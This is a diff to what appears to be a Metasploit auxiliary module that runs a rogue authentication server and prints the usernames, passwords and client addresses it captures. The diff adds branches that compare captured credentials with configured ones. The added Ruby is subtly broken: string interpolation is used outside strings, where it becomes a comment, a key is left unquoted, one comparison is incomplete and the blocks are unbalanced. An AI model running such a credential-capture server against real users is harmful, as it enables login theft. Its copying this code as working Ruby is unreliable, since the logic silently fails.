@@ -1,6 +1,7 @@
 ##
 # This module requires Metasploit: http//metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
+#
 ##
 
 require 'msf/core'
@@ -55,7 +56,7 @@ class Metasploit3 < Msf::Auxiliary
     false
   end
 
-  def run
+  def run #We set all the options here.
     @myhost   = datastore['SRVHOST']
     @myport   = datastore['SRVPORT']
     @realm    = datastore['REALM']
@@ -121,11 +122,32 @@ end
         print_good("Credentials found! - User: #{user} Pass: #{pass} Server: #{datastore['SRVHOST']}:#{datastore['SRVPORT']} Client: #{cli.peerhost}")
         print_status("Credentials are not set to be matched")
       elsif #{datastore['CHKCRDS']} == "true"
-        if condition
+        if #{datastore['CHKONLYUSER']} == "false" and #{datastore['CHKONLYPASS']} == "false"
+          print_good("Credentials found! - User: #{user} Pass: #{pass} Server: #{datastore['SRVHOST']}:#{datastore['SRVPORT']} Client: #{cli.peerhost}")
+          if #{datastore['SETCRDU']} == #{user} and #{datastore['SETCRDP']}
+            print_good("Credentials matched! - Set User: #{datastore['SETCRDU']} Set Password: #{datastore['SETCRDP']}")
+          else
+            print_status("Credentials do not match!! - Set Username: #{datastore[SETCRDU]} Set Password: #{datastore['SETCRDP']}")
+            
+          end
+          if #{datastore['SETCRDU']} == #{user} and #{datastore['SETCRDP']} == #{pass}
+            print_good("Credentials found! - User: #{user} Pass: #{pass} Server: #{datastore['SRVHOST']}:#{datastore['SRVPORT']} Client: #{cli.peerhost}")
+            print_good("Credentials matched! - Set Username: #{datastore['SETCRDU']} Set Password: #{datastore['SETCRDP']}")
+          else
+            print_status("Credentials do not match!! - Set Username: #{datastore['SETCRDU']} Set Password: #{datastore['SETCRDP']}")
+            
+          end
           
         end
-        
-        
+        if #{datastore['CHKCRDS']} == "true" and #{datastore['CHKONLYUSER']} == "true"
+          if #{datastore['CHKONLYPASS']} == "false"
+            print_good("Credentials found! - User: #{user} Pass: #{pass} Server: #{datastore['SRVHOST']}:#{datastore['SRVPORT']} Client: #{cli.peerhost}")
+            print_good("Credentials matched! - Set Username: #{datastore['SETCRDU']} Set Password: #{datastore['SETCRDP']}")
+          else
+            print_status("Credentials do not match!! - Set Username: #{datastore['SETCRDU']} Set Password: #{datastore['SETCRDP']}")
+
+          
+        end
       end
       
 
